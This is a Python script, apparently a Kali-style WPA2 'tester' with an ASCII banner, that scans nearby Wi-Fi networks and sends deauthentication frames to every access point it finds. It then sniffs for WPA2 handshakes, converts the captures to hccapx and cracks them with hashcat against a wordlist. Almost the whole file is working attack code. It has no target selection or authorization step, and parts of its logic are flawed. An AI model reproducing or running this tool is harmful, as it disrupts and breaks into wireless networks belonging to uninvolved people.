#KALI_WPA2_TESTER
#7/03/2023 
#KING AND COUNRTY 
#VERSION:1.0
'''
LIBRARY API FUNCTIONALITY WILL BE ADDED IN LATER VERSIONS ALONG WITH MORE USER INPUT OPTIONS 
⣶⣄⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⠿⣫⣾⠟⠁
⣶⣝⢿⣦⡀⠙⠻⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⡿⢛⣵⡿⠋⠀⢀⣤
⣿⣿⣷⣮⡻⣷⣄⠈⠛⢿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⢟⣫⣾⠟⠁⢀⣠⣾⣿⣿
⣿⣿⣿⣿⣿⣾⣝⢿⣦⡀⠉⠻⠀⣿⣿⣿⣿⠀⣟⣵⠿⠋⠀⣠⣴⣿⣿⣿⣿⣿
⠿⠿⠿⠿⠿⠿⠿⠷⠯⠻⠶⠄⠀⣿⣿⣿⣿⠀⠟⠁⠀⠴⠾⠿⠿⠿⠿⠿⠿⠿
⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿
⣶⣶⣶⣶⣶⣶⣶⡶⠒⠀⢀⣴⠀⣿⣿⣿⣿⠀⠐⢶⣦⡲⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⠟⠋⠀⣠⣾⢟⣥⠀⣿⣿⣿⣿⠀⣦⡀⠉⠻⣶⣝⢿⣿⣿⣿⣿⣿
⣿⣿⡿⠛⠁⢀⣴⡿⣫⣴⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣶⣄⠈⠙⢷⣮⡻⣿⣿⣿
⠟⠉⠀⣠⣾⢟⣥⣾⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣦⡀⠉⠻⣷⣝⠿
⢀⣴⡿⣫⣶⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣷⣄⡈⠙⠷
SEE README FOR DETAILS AND INFO ON CURRENT DEVELOPMENT 
COMMENTS AND DOCUMENTATION PROVIDED BY OPEN_AI
'''
import wifi
from scapy.all import *
import time
import os
import multiprocessing

'''
FOLLWING NOT INCLUDED IN STANDARD VSC IDE / PYLANCE / PYTHON:
wifi
scapy
'''

# Scan for available Wi-Fi networks
def scan_wifi(interface):
    results = wifi.Cell.all(interface)
    networks = []
    for cell in results:
        network = {
            "ssid": cell.ssid,
            "bssid": cell.address,
            "channel": cell.channel,
            "frequency": cell.frequency,
            "quality": cell.quality,
            "encryption_type": cell.encryption_type
        }
        networks.append(network)
    return networks

# Send deauthentication packets to target devices
def deauth_mac(networks, interface):
    for network in networks:
        mac = network["bssid"]
        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=mac, addr2=mac, addr3=mac) / Dot11Deauth(reason=7)
        sendp(pkt, iface=interface, count=5, inter=0.1)
        print(f"Sent deauth packet to {mac}")
        time.sleep(0.5)

# Convert pcap files to hccapx format
def pcap_to_hccapx(pcap_file):
    hccapx_file = pcap_file.split(".")[0] + ".hccapx"
    os.system(f"cap2hccapx.bin {pcap_file} {hccapx_file}")
    return hccapx_file

# Test wordlist using hashcat's "--stdout" option
def test_wordlist(hccapx_file, wordlist):
    os.system(f"hashcat -m 2500 {hccapx_file} --stdout --potfile-disable {wordlist} > /dev/null")
    return True

# Process hccapx files using hashcat
def run_hashcat(hccapx_file, wordlist):
    os.system(f"hashcat -m 2500 {hccapx_file} {wordlist}")

# Handle WPA2 handshakes in captured packets
def handle_packet(pkt):
    if pkt.haslayer(EAPOL):
        if pkt[EAPOL].type == 3:
            print("WPA2 handshake detected!")
            wrpcap("handshakes.cap", pkt, append=True)

# Set the interface to monitor mode
os.system("iwconfig wlan0 mode monitor")

# Scan for available Wi-Fi networks
interface = "wlan0"
networks = scan_wifi(interface)

# Create a multiprocessing pool
pool = multiprocessing.Pool(processes=2)

# Send deauthentication packets and listen for captured packets simultaneously
pool.apply_async(deauth_mac, args=(networks, interface))
pool.apply_async(sniff, kwds={"prn": handle_packet, "iface": interface})

# Convert pcap files to hccapx format
pcap_files = ["handshakes.cap"]
hccapx_files = []
for pcap_file in pcap_files:
    hccapx_file = pcap_to_hccapx(pcap_file)
    hccapx_files.append(hccapx_file)

# Test wordlist
wordlist = str(input("INPUT WORDLIST NAME \n SAME DIR: "))
for hccapx_file in hccapx_files:
    if not test_wordlist(hccapx_file, wordlist):
        print(f"Wordlist '{wordlist}' failed for {hccapx_file}")
        exit()

# Process hccapx files using hashcat
for hccapx_file in hccapx_files:
    run_hashcat(hccapx_file, wordlist)